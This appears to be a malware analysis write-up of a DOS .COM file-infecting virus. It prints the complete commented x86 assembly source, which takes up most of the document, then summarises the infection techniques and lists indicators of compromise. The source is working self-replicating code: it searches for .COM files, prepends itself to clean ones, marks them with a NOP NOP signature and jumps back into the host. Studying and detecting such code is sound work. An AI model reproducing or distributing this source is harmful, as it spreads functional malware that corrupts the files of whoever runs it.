
# Analysis of a DOS COM File Infector Virus

## Introduction

This document provides an in-depth analysis of a DOS-based `.COM` file infector virus written in x86 assembly (tiny model). The malware operates by infecting other `.COM` files in the current directory, using low-level DOS interrupts and direct memory manipulation. It avoids infecting system-critical files (like `COMMAND.COM`) and marks infected files with a `NOP NOP` signature. It does not remain memory-resident, but uses a FAR JMP to maintain control after execution.

https://www.virustotal.com/gui/file/c17dc774329fda62b91c2d30034836d5d864540cff128405f6f824d1168058f1/detection

## General Behavior

- Backs up the command-line arguments.
- Copies itself into a memory buffer for use in infections.
- Searches for `.COM` files, excluding critical ones.
- Checks if target files are already infected or too large.
- Prepends the virus to clean files and rewrites them.
- Restores parameters and installs a FAR JMP at the memory top.
- Exits gracefully.

## Technical Analysis

### Full Source Code with Inline Comments

```asm
.model  tiny
.code
org     100h         ; Entry point for .COM file (starts at CS:0100h)

kkk:                 ; Start of the virus

    nop             ; Infection marker: NOP NOP (bytes 90 90)
    nop

    ; Save command-line parameters (from PSP:80h, 128 bytes)
    mov     cx,80h                  ; Set counter to 128 bytes
    mov     si,0080h                ; Source = PSP command-line buffer
    mov     di,0ff7fh               ; Destination = safe zone (0FF7Fh)
    rep     movsb                   ; Copy parameters to safe zone

    ; Calculate the virus size
    lea     ax,begp                ; AX = address just after virus
    mov     cx,ax
    sub     ax,100h                ; Virus size = end - start
    mov     ds:[0fah],ax           ; Store virus size at memory offset 0FAh

    ; Set up read/write memory buffers
    add     cx,fso                 ; Add some extra space for safety
    mov     ds:[0f8h],cx           ; Store write buffer address at 0F8h
    add     cx,ax
    mov     ds:[0f6h],cx           ; Store read buffer address at 0F6h

    ; Copy the virus to the memory buffer
    mov     cx,ax                  ; CX = virus size
    lea     si,kkk                 ; SI = start of virus
    mov     di,ds:[0f8h]           ; DI = destination buffer
RB: rep     movsb                  ; Copy virus into memory

    stc                            ; Set carry flag (used by int 21h)

    ; Find first *.COM file in current directory
    lea     dx,fff                 ; DX = "*.COM" search mask
    mov     ah,4Eh                 ; DOS interrupt: Find First File
    mov     cx,20H                 ; File attribute: archive
    int     21h

    or      ax,ax
    jz      LLL                    ; If success, jump to loop
    jmp     done                   ; If no file found, exit

LLL:
    ; Get current DTA (Disk Transfer Area) address
    mov     ah,2Fh
    int     21h                    ; ES:BX = DTA pointer

    ; Get file size from DTA
    mov     ax,es:[bx+1ah]         ; File size
    mov     ds:[0fch],ax           ; Save file size at 0FCh

    add     bx,1eh                 ; BX = pointer to filename in DTA
    mov     ds:[0feh],bx           ; Save pointer at 0FEh

    ; Skip files starting with "CO" (e.g., COMMAND.COM)
    mov     ax,'OC'                ; "CO" in little-endian
    sub     ax,ds:[009eh]          ; Compare with filename's first 2 letters
    je      fin                    ; If match, skip file

    ; Ensure file + virus size won't exceed memory limits
    add     ax,180h
    add     ax,ds:[0fah]           ; Add virus size
    add     ax,fso
    cmp     ax,0fff0h              ; Check against max allowed
    ja      fin                    ; Too large → skip file

    ; Open the file for reading & writing
    clc
    mov     ax,3d02h               ; DOS: open file R/W (3D function)
    mov     dx,bx                  ; DX = pointer to filename
    int     21h                    ; Open file

    ; Read contents into buffer
    mov     bx,ax                  ; BX = file handle
    mov     ah,3fh                 ; Function: read file
    mov     cx,ds:[0fch]           ; Size to read
    mov     dx,ds:[0f6h]           ; Destination buffer
    int     21h

    ; Check for infection marker (90 90)
    mov     bx,dx
    mov     ax,[bx]
    sub     ax,9090h
    jz      fin                    ; Already infected → skip

    ; Check if file is MZ executable (EXE file)
    mov     al,'M'
    mov     di,dx
    mov     cx,ds:[0fch]
    repne   scasb                  ; Look for 'M'
    jne     cont                   ; Not found → continue
    mov     al,'Z'
    cmp     es:[di],al             ; Check if next is 'Z'
    je      fin                    ; "MZ" header found → skip file

cont:
    ; Save original file size just before the buffer
    mov     ax,ds:[0fch]
    mov     bx,ds:[0f6h]
    mov     [bx-2],ax              ; Store at [buffer-2]

    ; Create new infected file (overwrite the original)
    mov     ah,3ch                 ; Create file
    mov     cx,00h                 ; Normal attribute
    mov     dx,ds:[0feh]           ; Filename
    clc
    int     21h

    mov     bx,ax                  ; BX = new file handle
    mov     ah,40h                 ; Write to file
    mov     cx,ds:[0fch]           ; Original file size
    add     cx,ds:[0fah]           ; + virus size
    mov     dx,ds:[0f8h]           ; Buffer with virus + file
    int     21h

    ; Close file
    mov     ah,3eh
    int     21h

FIN:
    ; Find next *.COM file
    stc
    mov     ah,4fh                 ; Find Next File
    int     21h

    or      ax,ax
    jnz     done                   ; No more files → exit
    jmp     LLL                    ; Continue with next file

DONE:
    ; Restore command-line parameters from earlier
    mov     cx,80h
    mov     si,0ff7fh
    mov     di,0080h
    rep     movsb

    ; Patch a FAR JMP instruction at top of memory (FFF9h)
    mov     ax,0A4F3H              ; Segment part of JMP FAR
    mov     ds:[0fff9h],ax
    mov     al,0eah                ; Opcode for JMP FAR
    mov     ds:[0fffbh],al
    mov     ax,100h                ; Offset part
    mov     ds:[0fffch],ax

    ; Store segment and setup for later
    lea     si,begp
    lea     di,kkk
    mov     ax,cs
    mov     ds:[0fffeh],ax         ; Segment for JMP
    mov     kk,ax
    mov     cx,fso

    ; Actual bytes for JMP FAR instruction
    db      0eah                   ; JMP FAR opcode
    dw      0fff9h                 ; Offset to jump to
kk  dw      0000h                  ; Segment (will be replaced earlier)

fff     db  '*?.com',0             ; File search pattern
fso     dw  0005h                  ; Additional offset (buffer space)

begp:
    ; Clean program termination
    mov     ax,4C00h
    int     21h

end kkk

```

## Techniques Used

### File Infection
- Scans for `.COM` files via `INT 21h, AH=4Eh/4Fh`.
- Marks infection with `NOP NOP` at file start.
- Prepend virus to a clean file and save as original.

### Stealth / Anti-Detection
- Skips system files starting with `CO` (COMMAND.COM).
- Avoids re-infecting already infected files.
- Checks for MZ (Windows EXE) signature.

### Memory Control
- Installs a FAR JMP at `0xFFFB` to redirect execution to virus entry point.

## Conclusion

A compact, clean example of a DOS file-infecting virus:
- Straightforward infection logic.
- No advanced obfuscation.
- Leverages DOS interrupt calls and memory manipulation.
- Potentially detectable via signature-based methods.

## Indicators of Compromise (IOCs)
- File starts with `NOP NOP` (`0x9090`).
- FAR JMP installed at memory `0xFFFB` pointing to `0x0100`.
- Uses DOS INT 21h: 3Dh, 3Fh, 40h, 4Eh, 4Fh, 3Ch, 2Fh.
- Skips files starting with `"CO"` and avoids `.EXE` format.

![screenshot](screenshot.png)
